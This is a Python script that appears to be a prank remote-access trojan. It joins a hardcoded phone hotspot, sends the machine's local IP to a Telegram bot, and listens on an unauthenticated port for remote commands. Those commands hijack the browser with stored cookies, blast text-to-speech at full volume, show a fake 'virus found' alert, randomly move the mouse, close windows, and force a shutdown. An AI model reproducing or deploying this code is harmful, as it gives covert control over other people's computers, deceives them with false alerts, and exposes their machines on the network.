import os
import sys
import time
import random
import socket
import webbrowser
import logging
import pyautogui
import gtts
import mouse
import ctypes
import pickle
import pywifi
from pywifi import const
from playsound import playsound
from aiogram.utils import executor
from aiogram import Bot, Dispatcher, types
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver import Chrome, ChromeOptions
from selenium.webdriver.common.action_chains import ActionChains
from tkinter import messagebox

def connect_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    tmp_profile = ''

    is_existing_profile = False
    profiles = iface.network_profiles()
    for profile in profiles:
        if profile.ssid == ssid:
            is_existing_profile = True
            tmp_profile = profile
            break

    if not is_existing_profile:
        tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)

try:
    connect_wifi('iPhone (999)', '1234567890')
except:
    connect_wifi('iPhone (999)', '1234567890')

time.sleep(5)

TG_BOT_TOKEN = 'YOUR_TOKEN'

logging.basicConfig(level=logging.INFO)

bot = Bot(token=TG_BOT_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler()
async def send_message(message: types.Message):
    await message.answer(f'{socket.gethostbyname_ex(socket.gethostname())[-1][-1]}')

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((socket.gethostbyname_ex(socket.gethostname())[-1][-1], 4321))
    server.listen()

    while True:
        user, adres = server.accept()

        while True:
            try:
                data = user.recv(1024).decode('cp1251').lower()

                if str(data.split(', ')[0]) == 'поиск':
                    options = ChromeOptions()
                    options.add_argument('useragent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.931 YaBrowser/23.9.3.931 Yowser/2.5 Safari/537.36')
                    options.add_argument('--disable-blink-features=AutomationControlled')
                    options.add_experimental_option("detach", True)

                    driver = Chrome(options=options)

                    driver.maximize_window()

                    try:
                        driver.get('https://www.google.ru')
                        time.sleep(3)

                        info_input = driver.find_element(By.CLASS_NAME, 'gLFyf')
                        info_input.clear()
                        info_input.send_keys(data.split(',')[-1])
                        time.sleep(2)

                        info_input.send_keys(Keys.ENTER)
                        time.sleep(2)

                        driver.find_element(By.ID, 'search').find_element(By.XPATH, '//*[@jsname="UWckNb"]').click()

                    except Exception as _ex:
                        print(_ex)

                if str(data.split(', ')[0]) == 'youtube':
                    options = ChromeOptions()
                    options.add_argument('useragent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.931 YaBrowser/23.9.3.931 Yowser/2.5 Safari/537.36')
                    options.add_argument('--disable-blink-features=AutomationControlled')
                    options.add_experimental_option("detach", True)

                    driver = Chrome(options=options)

                    driver.maximize_window()

                    try:
                        driver.get('https://www.youtube.com/')
                        time.sleep(3)

                        for cookie in pickle.load(open('additional/cookies', 'rb')):
                            driver.add_cookie(cookie)
                        time.sleep(3)

                        driver.refresh()
                        time.sleep(3)

                        if len(data.split()) > 1:
                            info_input = driver.find_element(By.XPATH, '//input[@id="search"]')
                            info_input.send_keys(data.split(',')[1])
                            time.sleep(3)

                            info_input.send_keys(Keys.ENTER)
                            time.sleep(3)

                            pyautogui.press('Esc')
                            time.sleep(2)

                            while True:
                                find_more_element = driver.find_element(By.TAG_NAME, 'ytd-video-renderer')

                                if driver.find_element(By.TAG_NAME, 'ytd-video-renderer'):
                                    driver.find_element(By.TAG_NAME, 'ytd-video-renderer').click()
                                    time.sleep(3)
                                    break
                                else:
                                    action = ActionChains(driver)
                                    action.move_to_element(find_more_element).perform()

                            try:
                                driver.find_element(By.CSS_SELECTOR, "[data-title-no-tooltip='Во весь экран']").click()
                                time.sleep(3)
                            except:
                                driver.find_element(By.TAG_NAME, 'ytd-video-renderer').click()

                    except Exception as _ex:
                        continue

                elif str(data.split(', ')[0]) == 'vk':
                    webbrowser.open('https://vk.com')

                elif str(data.split(', ')[0]) == 'merojax':
                    webbrowser.open('https://merojax.me')

                elif str(data.split(', ')[0]) == 'audio':
                    for _ in range(50):
                        pyautogui.hotkey('volumeup')

                    def play_and_remove_file(file_path):
                        playsound(file_path)
                        if os.path.exists('audio.mp3'):
                            os.remove('audio.mp3')

                    if len(data.split()) > 1:
                        text = gtts.gTTS(data.split(', ')[1], lang='ru')
                        text.save('additional/audio.mp3')
                        play_and_remove_file('additional/audio.mp3')
                    else:
                        play_and_remove_file('additional/mem.mp3')

                elif str(data.split(', ')[0]) == 'message':
                    if len(data.split(', ')) > 2:
                        messagebox.showerror(data.split(', ')[1], data.split(', ')[2])
                    else:
                        messagebox.showerror('Error', 'А virus has been found in your computer, you should check the system')

                elif str(data.split(', ')[0]) == 'mouse':
                    user32 = ctypes.windll.user32
                    timeout = 5
                    timeout_start = time.time()
                    if len(data.split(', ')) > 1:
                        timeout = int(data.split(', ')[1])

                    while time.time() < timeout_start + timeout:
                        mouse.move(x=random.randint(0, int(user32.GetSystemMetrics(0))),
                                   y=random.randint(0, int(user32.GetSystemMetrics(1))))
                        time.sleep(0.2)


                elif str(data.split(', ')[0]) == 'shutdown':
                    os.system('shutdown /s /f')

                elif str(data.split(', ')[0]) == 'close':
                    pyautogui.press('f')
                    pyautogui.hotkey('alt', 'f4')

                elif data == 'exit':
                    wifi = pywifi.PyWiFi()
                    iface = wifi.interfaces()[0]
                    iface.disconnect()
                    sys.exit()

            except Exception as _ex:
                continue

if __name__ == '__main__':
    import threading
    server_thread = threading.Thread(target=start_server)
    server_thread.start()
    executor.start_polling(dp)